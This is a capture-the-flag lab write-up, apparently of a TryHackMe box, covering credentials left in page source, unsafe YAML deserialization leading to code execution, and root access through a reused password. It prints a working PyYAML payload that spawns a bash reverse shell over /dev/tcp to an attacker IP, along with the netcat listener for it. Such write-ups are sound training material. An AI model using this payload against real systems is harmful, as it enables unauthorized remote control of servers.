# Beach Bar Write-up

## Target Information

* **Target IP:** `10.129.168.220`
* **Website:** `http://10.129.168.220/`
* **Initial credentials:** `dj:dj`
* **User:** `bartender`
* **Privilege escalation:** Credential reuse

---

## 1. Web Enumeration

I started by accessing the target:

```text
http://10.129.168.220/
```

The application redirected me to:

```text
http://10.129.168.220/login
```

This presented a login page.

I inspected the page source code and found credentials:

```text
dj:dj
```

I used these credentials to authenticate to the application.

---

## 2. YAML Import Functionality

After logging in, I discovered an import page at:

```text
http://10.129.168.220/import
```

The page provided a **YAML upload functionality**.

Since YAML parsers can potentially be vulnerable to unsafe deserialization, I tested whether the application would process Python-specific YAML objects.

The application accepted Python object deserialization syntax, indicating that it was using an unsafe YAML deserialization mechanism.

---

## 3. Exploiting YAML Deserialization for RCE

I prepared a YAML payload that invokes `subprocess.Popen` and establishes a reverse shell:

```yaml
!!python/object/apply:subprocess.Popen
- - /bin/bash
  - -c
  - /bin/bash -i >& /dev/tcp/192.168.129.103/4444 0>&1
```

Before uploading the payload, I started a listener on my attacking machine:

```bash
nc -lvnp 4444
```

I then uploaded the YAML file through the `/import` functionality.

The payload was processed by the vulnerable YAML deserializer, and I received a reverse shell on my machine.

I now had command execution on the target.

---

## 4. User Flag

After obtaining the shell, I checked the available users and navigated to the `bartender` home directory:

```bash
cd /home/bartender
```

I found the user flag:

```bash
cat user.txt
```

The flag was:

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

At this point, I had successfully obtained the **user flag**.

---

# 5. Privilege Escalation

Next, I started enumerating the system for possible privilege-escalation vectors.

I checked the running processes:

```bash
ps aux
```

Among the processes, I found a Python service running as `root`:

```text
root 613 ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass ... --bitrate 320k
```

The process command line contained a `--stream-pass` argument with the password:

```text
SunsetSpritz2024!
```

This immediately looked interesting because it appeared to be a credential exposed through the command-line arguments of a root-owned process.

---

## 6. Credential Reuse

I attempted to reuse the discovered password for the `root` account:

```bash
su root
```

I entered:

```text
SunsetSpritz2024!
```

The password worked, giving me a root shell.

I verified my privileges:

```bash
whoami
```

Output:

```text
root
```

---

## 7. Root Flag

Finally, I moved to the root user's home directory:

```bash
cd /root
```

and read the root flag:

```bash
cat root.txt
```

The flag was:

```text
THM{cr3d3nt14l_reus3_4t_th3_b34ch_b4r}
```

---

# Conclusion

The complete attack chain was:

```text
Web enumeration
      ↓
Login credentials found in source
      ↓
dj:dj
      ↓
/import YAML upload
      ↓
Unsafe YAML deserialization
      ↓
Python object invocation
      ↓
Reverse shell / RCE
      ↓
bartender user
      ↓
user.txt
      ↓
ps aux
      ↓
Root Python service
      ↓
Password exposed in process arguments
      ↓
Credential reuse
      ↓
su root
      ↓
Root
      ↓
root.txt
```

## Flags

**User flag:**

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

**Root flag:**

```text
THM{cr3d3nt14l_reus3_4t_th3_b34ch_b4r}
```

## Key Lessons

1. **Always inspect web application source code.** Credentials or useful information can sometimes be accidentally exposed.
2. **YAML upload functionality deserves security testing**, especially when the backend uses unsafe deserialization.
3. **Unsafe deserialization can lead to RCE** when arbitrary Python objects/functions can be instantiated.
4. **Enumerate running processes during privilege escalation.** `ps aux` can reveal services, credentials, scripts, and useful command-line arguments.
5. **Look for credential reuse.** A password exposed by one service may also work for a privileged account.
